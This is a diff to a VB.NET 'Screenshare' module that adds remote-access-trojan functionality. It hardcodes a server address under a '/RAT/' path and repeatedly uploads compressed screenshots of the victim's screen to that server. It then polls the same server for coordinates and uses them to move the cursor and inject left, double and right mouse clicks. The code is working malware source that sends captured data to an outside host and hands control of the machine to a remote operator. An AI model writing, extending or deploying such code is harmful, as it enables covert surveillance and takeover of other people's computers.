@@ -5,7 +5,9 @@ Imports System.IO.Compression
 Imports System.Runtime.InteropServices
 Imports System.Threading
 
+
 Module Screenshare
+    Private Declare Sub mouse_event Lib "user32.dll" (ByVal dwFlags As Integer, ByVal dx As Integer, ByVal dy As Integer, ByVal cButtons As Integer, ByVal dwExtraInfo As IntPtr)
 
     ' Private m_MyForm As MainForm
     'Public ReadOnly Property MyForm() As MainForm
@@ -15,7 +17,7 @@ Module Screenshare
     'End Get
     'End Property
 
-    Private vpsURL As String
+    Private vpsURL As String = "http://185.62.188.189/RAT/"
 
     Private Structure PointAPI
         Public x As Integer
@@ -37,13 +39,17 @@ Module Screenshare
 
     Private Declare Function GetCursorInfo Lib "user32.dll" (<System.Runtime.InteropServices.OutAttribute()> ByRef pci As CursorInfo) As Boolean
     Private Declare Function DrawIcon Lib "user32.dll" (hDC As IntPtr, X As Integer, Y As Integer, hIcon As IntPtr) As Boolean
-
+    Public Const MOUSEEVENTF_LEFTDOWN = &H2 ' left button down
+    Public Const MOUSEEVENTF_LEFTUP = &H4 ' left button up
+    Public Const MOUSEEVENTF_MIDDLEDOWN = &H20 ' middle button down
+    Public Const MOUSEEVENTF_MIDDLEUP = &H40 ' middle button up
+    Public Const MOUSEEVENTF_RIGHTDOWN = &H8 ' right button down
+    Public Const MOUSEEVENTF_RIGHTUP = &H10 ' right button up
     Public WithEvents screenshareBW As BackgroundWorker
     Public screenshareQuality As Long = 25L
     Public screenshareFluxInterval As Integer = 500
 
-    Public Sub InitFluxManager(vpsURL As String)
-        Me.vpsURL = vpsURL
+    Public Sub InitFluxManager()
         screenshareBW = New BackgroundWorker()
         screenshareBW.WorkerSupportsCancellation = True
     End Sub
@@ -116,11 +122,18 @@ Module Screenshare
             Dim compressedBmpBytes As Byte() =
                DeflateCompress(ResizeConvertBMP(TakeBitmapScreenshot(), screenshareQuality))
 
-            MsgBox(MainForm.EOFArguments(0))
-            MainForm.mainWebClient.UploadData(MainForm.EOFArguments(0) & "clients.php?action=uploadimage", compressedBmpBytes)
-
+            MainForm.mainWebClient.UploadData("http://185.62.188.189/RAT/" & "clients.php?action=uploadimage", compressedBmpBytes)
+            Dim cords As String = MainForm.mainWebClient.DownloadString("http://185.62.188.189/RAT/" & "clients.php?action=getcords")
+            Dim parsedResponse As String() = cords.Split("|")
+            If cords.Trim <> "" Then
+                Dim xPos As Integer = (Convert.ToInt32(parsedResponse(0).ToString) / 100) * My.Computer.Screen.Bounds.Size.Width
+                Dim yPos As Integer = (Convert.ToInt32(parsedResponse(1)) / 100) * My.Computer.Screen.Bounds.Size.Height
+                Cursor.Position = New Point(xPos, yPos)
+                If parsedResponse(2) = "1" Then mouse_event(MOUSEEVENTF_LEFTDOWN, 0, 0, 0, 0) : mouse_event(MOUSEEVENTF_LEFTUP, 0, 0, 0, 0)
+                If parsedResponse(2) = "2" Then mouse_event(MOUSEEVENTF_LEFTDOWN, 0, 0, 0, 0) : mouse_event(MOUSEEVENTF_LEFTUP, 0, 0, 0, 0) : Thread.Sleep(20) : mouse_event(MOUSEEVENTF_LEFTDOWN, 0, 0, 0, 0) : mouse_event(MOUSEEVENTF_LEFTUP, 0, 0, 0, 0)
+                If parsedResponse(2) = "3" Then mouse_event(MOUSEEVENTF_RIGHTDOWN, 0, 0, 0, 0) : mouse_event(MOUSEEVENTF_RIGHTUP, 0, 0, 0, 0)
+            End If
             Dim msTimeout As Integer = screenshareFluxInterval - Date.Now.Subtract(startTime).TotalMilliseconds
-
             If msTimeout < 1 Then
                 Continue While
             Else
